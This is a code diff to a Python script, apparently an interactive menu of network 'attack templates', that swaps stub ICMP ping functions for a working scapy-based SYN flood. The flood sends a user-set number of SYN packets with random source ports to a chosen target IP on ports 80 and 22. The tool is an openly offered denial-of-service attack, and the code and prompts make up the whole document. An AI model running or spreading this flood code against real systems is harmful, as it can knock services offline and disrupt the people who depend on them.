@@ -28,44 +28,33 @@ values["tcp_ports"]=tcp_ports
 
 # To test comment out everything above (including the import block) and uncomment the block below. Also comment out the two scapy commands in lines 42 and 52
 '''
+from scapy.all import *
 import re
-values = {}
-tcp_ports = [80, 22]
-values["tcp_ports"]=tcp_ports
-target_mac_address = "ff:ff:ff:ff:ff:ff"
-values["target_mac_address"]=target_mac_address
-og_source_mac_address = "ff:ff:ff:ff:ff:ff"
-source_mac_address = "ff:ff:ff:ff:ff:ff"
-values["source_mac_address"]=source_mac_address
-og_source_ip = "1.1.1.1"
-source_ip = "1.1.1.1"
-values["source_ip"]=source_ip
-target_ip = "1.1.1.1"
-values["target_ip"]=target_ip
-values["quantity"]=100
+import sys
+import random
+import subprocess
 
+def get_ip():
+	ip = subprocess.getoutput("ip a | grep eth1")
+	return re.compile(r' inet (\d+\.\d+\.\d+\.\d+)').search(ip).group(1)
 
-# TEMPLATES EXAMPLE
-
-def icmp_ping1():
-    valid_var =["timeout", "target_ip"]
-    help_statement = "\nsends a ping packet"
-    print("\nRunning ICMP 1 attack, please enter the parameters:\n")
+# TEMPLATES EXAMPLE   
+def syn_flood():
+    print("SYN Flood")
+    valid_var = ["target_ip", "quantity"]
+    help_statement = "\nsends a multitude of SYN packets to attempt to overwhelm the target"
+    print("\nRunning SYN Flood attack, please enter the parameters:\n")
     variable_input(valid_var, help_statement)
     all_variables_inputted(valid_var)
     check_var(values, valid_var)
-    print("\nICMP 1 working")
-    #scapy.send(scapy.IP(dst=values.get("target_ip"))/scapy.ICMP())
-
-def icmp_ping2():
-    valid_var =["timeout", "target_ip", "target_mac_address"]
-    help_statement = "\nsends a ping packet"
-    print("\nRunning ICMP 2 attack, please enter the parameters:\n")
-    variable_input(valid_var, help_statement)
-    all_variables_inputted(valid_var)
-    check_var(values, valid_var)
-    print("ICMP 2 working")
-    #scapy.send(scapy.IP(dst=values.get("target_ip"))/scapy.ICMP())
+    template = IP(dst=values.get("target_ip"), ttl=99)/TCP(sport=RandShort(), seq=12345, ack=1000, flags="S")
+    ns = []
+    pktAmt = values.get("quantity")
+    for pktNum in range(0,pktAmt):
+    	ns.extend(template)
+    	ns[pktNum][TCP].dport = random.choice(tcp_ports)
+    send(ns)
+    print("Packets sent")
 
 # Confirms with user that all the variables are correct
 def check_var(values, required_var_list):
@@ -81,7 +70,7 @@ def check_var(values, required_var_list):
         elif correct == "no":
             new_num = int(input("\nWhich variable do you want to edit? (Enter a number): "))
             try:
-                variable = list(values.keys())[new_num]
+                variable = required_var_list[new_num]
                 print(f"\n{variable} Selected")
                 new_val = input(f"\nEnter the new value for {variable}: ")
                 variable_error_handling(variable, new_val)
@@ -101,6 +90,7 @@ def variable_input(required_variable_list, help_statement):
         elif user_input == "help":
             print(help_statement)
             help_func(required_variable_list)
+            print("Enter done if everything is set to preference")
             print("")
         elif " = " in user_input:
             variable = user_input.split(" = ")[0]
@@ -186,23 +176,38 @@ def reset():
 
 
 ########## MAIN MENU EXAMPLE ##########
+values = {}
+tcp_ports = [80, 22]
+values["tcp_ports"]=tcp_ports
+target_mac_address = "ff:ff:ff:ff:ff:ff"
+values["target_mac_address"]=target_mac_address
+og_source_mac_address = "ff:ff:ff:ff:ff:ff"
+source_mac_address = "ff:ff:ff:ff:ff:ff"
+values["source_mac_address"]=source_mac_address
+og_source_ip = get_ip()
+source_ip = get_ip()
+values["source_ip"]=source_ip
+target_ip = "1.1.1.1"
+values["target_ip"]=target_ip
+values["quantity"]=100
 
-available_templates = {"Attack Name/Explination":"attack_function_name"}
-
-if 80 in tcp_ports:
-    available_templates["ICMP Ping1"]=icmp_ping1
-
-if 22 in tcp_ports:
-    available_templates["ICMP Ping2"]=icmp_ping2
+available_templates = {"Attack Name/Explaination":"attack_function_name"}
+    
+if len(tcp_ports) != 0:
+    available_templates["SYN Flood"]=syn_flood
 
 while True:
+    #print(og_source_ip)
     for i, item in enumerate(list(available_templates.keys())[1:],1):
         print("\n", i, '. ' + item, sep='',end='')
     try:
         data = int(input("\n\nWhich Attack? (Enter a Number): "))
+        #print(available_templates.get(list(available_templates.keys())[data])())
         available_templates.get(list(available_templates.keys())[data])()
         reset()
-        break
+    except KeyboardInterrupt:
+    	print("\nExiting program")
+    	sys.exit()
     except:
         print("\nInvalid input", data)
 
